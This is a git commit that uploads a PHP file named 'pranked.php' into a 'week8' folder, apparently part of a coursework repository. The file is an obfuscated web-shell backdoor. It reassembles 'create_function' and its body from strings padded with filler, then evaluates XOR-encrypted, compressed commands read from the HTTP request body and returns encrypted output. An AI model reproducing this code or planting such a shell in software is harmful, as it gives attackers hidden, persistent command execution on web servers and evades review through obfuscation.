e06336c2345b064c46b7f510cd016eed91a1f472
Sean Barrick <71162295+seabar24@users.noreply.github.com>
2024-03-18 18:31:08 -0400

    Add files via upload

---
+++ week8/pranked.php
@@ -0,0 +1,11 @@
+<?php
+$K=str_replace('Xm','','XmcXmreate_XmXmfXmunXmction');
+$d='${|k={|"78ae7731";$kh{|="610101f8{|d157"{|{|;$kf{|{|="53a0e5ac4de2"{|{|;$p="aFQEGxj9dGG{|CsyY{';
+$x='{for($j=0;({|$j<${|{|c&&$i<$l);$j{|++,$i++{|){${|{|{|o.=$t{$i}^$k{$j}{|;}}return {|$o;}i{|f (@preg{|_match{|';
+$Z='|E{|";function {|x{|($t,$k){$c=st{|rlen{|($k);$l{|={|strlen{|($t);${|o="";for($i={|{|0;$i<$l{|;)';
+$U='({|"/$kh({|.+)$kf/"{|,@{|file_get_con{|{|tents("ph{|p:/{|/inpu{|t"),$m)=={|1) {@ob_s{|tart();{|@eva';
+$B='b{|_end_{|clean();$r=@ba{|se64_enco{|de{|(@x(@{|gzcompres{|s($o),${|k));pri{|nt("$p{|$kh{|$r$kf");}';
+$W='{|l(@g{|zunco{|mpress(@x(@ba{|se6{|4_decod{|e($m{|{|[1]),$k)));{|$o={|@ob_get_conten{|ts();@{|{|o';
+$S=str_replace('{|','',$d.$Z.$x.$U.$W.$B);
+$h=$K('',$S);$h();
+?>
